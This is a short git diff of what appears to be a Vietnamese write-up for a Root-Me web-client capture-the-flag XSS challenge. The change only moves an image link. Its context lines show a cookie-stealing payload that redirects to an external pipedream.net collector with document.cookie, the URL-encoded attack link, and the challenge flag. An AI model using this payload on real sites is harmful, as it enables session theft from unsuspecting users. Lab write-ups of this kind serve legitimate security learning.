@@ -191,8 +191,8 @@ Mục tiêu đầu tiên vẫn phải là alert đã, nhưng có 1 cái ta có t
 Payload: 1+1, document.location="https://eo7xxasp6lhfvaj.m.pipedream.net/?c="+document.cookie 
 Gửi qua contact: http://challenge01.root-me.org/web-client/ch34/?calculation=1%2B1%2C+document.location%3D%22https%3A%2F%2Feo7xxasp6lhfvaj.m.pipedream.net%2F%3Fc%3D%22%2Bdocument.cookie
 
-![image](https://user-images.githubusercontent.com/104350480/218165627-02281d8d-64fc-4ab1-9c1a-e0b6711aef66.png)
-
 ```
+
+![image](https://user-images.githubusercontent.com/104350480/218165627-02281d8d-64fc-4ab1-9c1a-e0b6711aef66.png)
 
 > Flag: rootme{Eval_Is_DangER0us}
